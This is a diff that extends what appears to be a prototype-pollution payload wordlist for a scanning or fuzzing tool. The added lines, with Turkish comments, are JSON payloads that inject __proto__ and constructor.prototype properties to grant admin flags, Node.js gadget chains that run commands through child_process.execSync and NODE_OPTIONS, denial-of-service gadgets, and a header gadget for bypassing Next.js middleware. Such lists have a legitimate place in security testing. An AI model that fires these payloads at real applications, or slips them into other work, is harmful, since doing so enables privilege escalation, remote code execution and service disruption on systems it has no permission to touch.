@@ -128,3 +128,20 @@ $.extend({}, {"__proto__": {"polluted": "yes"}})
 # _read_lines() processes one line at a time and multi-line entries would
 # be split into meaningless fragments. JSON equivalents above cover the same
 # attack surface for _read_lines()-based loading.
+
+# ── [v2026-06] MODERN / ADVANCED ADDITIONS ──
+# yetki yükseltme gadget'leri (JSON + query)
+{"__proto__":{"isAdmin":true}}
+{"constructor":{"prototype":{"isAdmin":true}}}
+{"a":{"__proto__":{"polluted":true}}}
+{"__proto__":{"status":"success"}}
+# Node.js RCE gadget zincirleri (child_process / NODE_OPTIONS)
+{"__proto__":{"argv0":"node","NODE_OPTIONS":"--require /proc/self/environ"}}
+{"__proto__":{"shell":"node","argv0":"console.log(require('child_process').execSync('id').toString())//"}}
+{"__proto__":{"sourceURL":"\nreturn process.mainModule.require('child_process').execSync('id')"}}
+{"__proto__":{"contextExtensions":[{"__proto__":null}]}}
+# DoS / davranış değiştirme
+{"__proto__":{"toString":{}}}
+{"__proto__":{"length":0}}
+# Next.js middleware bypass (CVE-2025-29927 stili header gadget)
+{"__proto__":{"x-middleware-subrequest":"1"}}
